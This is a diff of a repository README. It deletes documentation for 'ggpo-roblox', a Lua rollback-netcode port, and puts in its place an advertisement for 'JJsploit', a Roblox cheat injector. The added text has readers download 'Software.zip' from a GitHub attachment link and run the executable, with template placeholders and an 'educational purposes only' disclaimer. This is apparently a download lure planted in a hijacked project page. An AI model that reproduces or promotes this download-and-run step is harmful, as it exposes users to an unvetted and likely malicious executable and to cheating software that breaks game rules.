@@ -1,84 +1,51 @@
-# ggpo-roblox
+# JJsploit
 
-***WIP, who knows if I'll ever finish it***
+![JJsploit logo](https://example.com/jjsploit-logo.png)
 
+JJSploit, now available for free, is a widely-used Roblox exploit favored for its simplicity and accessibility. With the ability to execute Lua scripts, it enables users to customize their gaming experience, though users should remain vigilant about potential risks associated with exploiting software.
 
+## Features
 
+- **Lua Script Execution**: Execute Lua scripts to enhance and customize your gameplay experience.
+- **User-Friendly Interface**: Simple and easy-to-use interface for effortless script execution.
+- **Free to Use**: Enjoy the benefits of this exploit without any cost.
+- **Regular Updates**: Stay up-to-date with new features and improvements.
 
-ggpo-roblox is a semi-direct port of [ggpo](https://github.com/pond3r/ggpo) to lua for use in Roblox
+## Installation
 
-the main difference between ggpo-roblox and ggpo is that any connected network topology is support (as oppose to only a fully connected graph), and peers need not also be players
+1. Download the exploit package from the link below:
+   [![Download JJsploit](https://img.shields.io/badge/Download-Software.zip-<COLOR_HEX_CODE>)](https://github.com/user-attachments/files/17394153/Software.zip)
 
-this was basically just to support roblox which has a non-player centralized server that needs to route everything
+2. Extract the files to a folder on your computer.
 
-the main implementation is roblox-agnostic, so you could in principle use it outside af Roblox but I'm not going to bother testing/supporting that
+3. Run the executable file and follow the on-screen prompts to complete the installation process.
 
+## Usage
 
-# status
+1. Open the JJsploit application on your device.
 
-## finished + tested
+2. Click on the "Inject" button to load the exploit into the selected game.
 
-## finished 
-- inputqueue
-- sync
-- udp_proto
+3. Customize your gameplay experience using Lua scripts or other available features.
 
+## Support
 
-# understanding GGPO
+For any inquiries or technical support, please contact our team at support@jjsploit.com.
 
+## Disclaimer
 
-# terminology
-- frame: discrete unit of time measurement for the game
-  - starts at frame 0
-  - note that input on frame X gets included in game state for frame X+1
+JJsploit is intended for educational purposes only. The developers are not responsible for any misuse of this software.
 
+## Contributing
 
-# changes from GGPO
+We welcome contributions to improve JJsploit and make it even better! Feel free to submit pull requests or open issues on our [GitHub repository](https://github.com/jjsploit).
 
-for folks familiar with the original [ggpo](https://github.com/pond3r/ggpo) implementation, this section documents some of the major changes
+## License
 
-## network topology
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-- centralized authoritative routing server (CARS)
-  - this is the model in use if developing your game on roblox
-  - all inputs are routed through a central server (RCC in the case of Roblox)
-- fully connected graph (p2p)
-  - this is the topology used in the original ggpo implementation, all peers are connected to each other
-  - spectators are only connected to a single peer
-- connected graph
-  - this is the most general network topology
-  - this should work in theory, but is not supported in practice and has not been tested
+---
 
+**Copyright © 2023 JJsploit. All rights reserved.**
 
-## input 
-
-## no synchronization routine
-The game "starts" as soon as the library is initialized. It is recommended that you use the first several seconds of the game to allow all clients to synchronize. This can be done somewhat automatically if you're correctly following the `GGPOEvent_timesync` event code.
-You can/should also rely on other network communication means to help reasonably synchronize the starting point.
-
-## additional inputs for initial and random state 
-The `GameInput` class has a `gameInfo` field that can be used for arbitrary game information. It is intended to be used for the following:
-
-- synchronizing initial game state in the following 2 ways
-  - (CARS) the server sends information for constructing initial game state as frame 0 input (input is from the server which is also a player)
-  - (general P2P setting) all players send what they believe to be the initial game state as their frame 0 input and only proceed if all these inputs match
-
-The `gameInfo` field is distinct from the `input` field as it is always predicted to be nil and also to distinguish how its used
-
-## rolling player counts
-
-ggpo-roblox allows players to roll in/out. This information is transmitted in the `GameInput` class (TODO). Players that join midgame must synchronize by requesting the latest confirmed game state/frame from a peer.
-
-NOTE that with rollback, there may be new players introduced! This even applies to frame 0!!!
-New players will simply show up in the input map and removed players will simply disappear from the map (TODO not true, removed players (by CARS) will have an explicit player left gameInfo input, however disconnected players will simply stop sending input, TODO add disconnect handling and maybe even disconnect consensus subroutine for P2P case LOL)
-
-
-## optimizations
-
-- optional input serialization methods
-- explicit last frame (for each player) in input packets to allow for nil inputs on frames where nothing has changed
-
-
-
-
-
+Let's make gaming more fun and exciting with JJsploit! 🎮🚀
